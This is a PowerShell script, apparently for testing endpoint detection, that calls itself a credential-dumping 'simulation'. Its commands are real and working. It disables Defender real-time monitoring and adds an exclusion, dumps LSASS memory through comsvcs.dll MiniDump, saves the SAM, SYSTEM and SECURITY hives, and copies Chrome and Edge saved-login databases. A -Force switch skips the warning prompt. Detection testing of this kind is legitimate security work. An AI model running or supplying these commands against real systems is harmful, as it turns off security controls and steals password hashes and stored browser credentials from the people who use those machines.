param(
    [string]$OutputPath = "$env:TEMP\creddump",
    [switch]$CleanUp,
    [switch]$skipLsass,
    [switch]$skipSam,
    [switch]$skipBrowser,
    [switch]$Force
)

# Warning prompt
if (!$CleanUp -and !$Force) {
    Write-Host "`n==================================================================" -ForegroundColor Yellow
    Write-Host "                        ***  WARNING  *** " -ForegroundColor Red
    Write-Host "              Credential Dumping Simulation Script" -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow
    Write-Host "`nThis script performs credential dumping simulations that will:" -ForegroundColor Yellow
    Write-Host "  - Dump LSASS process memory (mimics Mimikatz behavior)" -ForegroundColor Red
    Write-Host "  - Extract SAM, SYSTEM, and SECURITY registry hives" -ForegroundColor Red
    Write-Host "  - Access browser credential databases" -ForegroundColor Red
    Write-Host "`nThese actions may trigger Microsoft Defender for Endpoint to:" -ForegroundColor Yellow
    Write-Host "  - Flag this device as compromised" -ForegroundColor Magenta
    Write-Host "  - ISOLATE THE DEVICE from the network" -ForegroundColor Magenta
    Write-Host "  - Generate critical security alerts" -ForegroundColor Magenta
    Write-Host "`nYour account may be subject to investigation and remediation." -ForegroundColor Yellow
    Write-Host "  - You should not run this script with a critical account." -ForegroundColor Yellow
    Write-Host "  - You should run this script with a testing account." -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow
    Write-Host "`nUse -Force parameter to skip this prompt." -ForegroundColor Gray
    Write-Host "`n"
    
    $confirmation = Read-Host "Do you want to continue? (Type 'YES' to proceed)"
    
    if ($confirmation -ne "YES") {
        Write-Host "`nOperation cancelled by user." -ForegroundColor Green
        exit
    }
    
    Write-Host "`nProceeding with credential dumping simulation..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

if ($CleanUp) {
    Remove-Item -Path $OutputPath -Recurse -Force -ErrorAction Ignore
}
else {
    if (!$skipLsass) {
        # Perform LSASS Dumping Attempt
        Write-Host "Running LSASS Simulation"
        Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath $OutputPath
        $lsassPID = (Get-Process -Name lsass).Id
        cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $OutputPath\lsas-out.dmp full"
    }

    if (!$skipSam) {
        # SAM Dumping
        Write-Host "Running SAM Dumping Simulation"
        reg save HKLM\sam "$OutputPath\sam" /y
        reg save HKLM\system "$OutputPath\system" /y
        reg save HKLM\security "$OutputPath\security" /y
    }

    if (!$skipBrowser) {
        # Browser Credential Dumping
        Write-Host "Running BrowserDump Simulation"
        esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" /d "$OutputPath\Chrome_Login_Data.tmp"
        esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" /d "$OutputPath\Chrome_Login_DataForAccount.tmp"
        esentutl.exe /y "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" /d "$OutputPath\Edge_Login_Data.tmp"
    }
}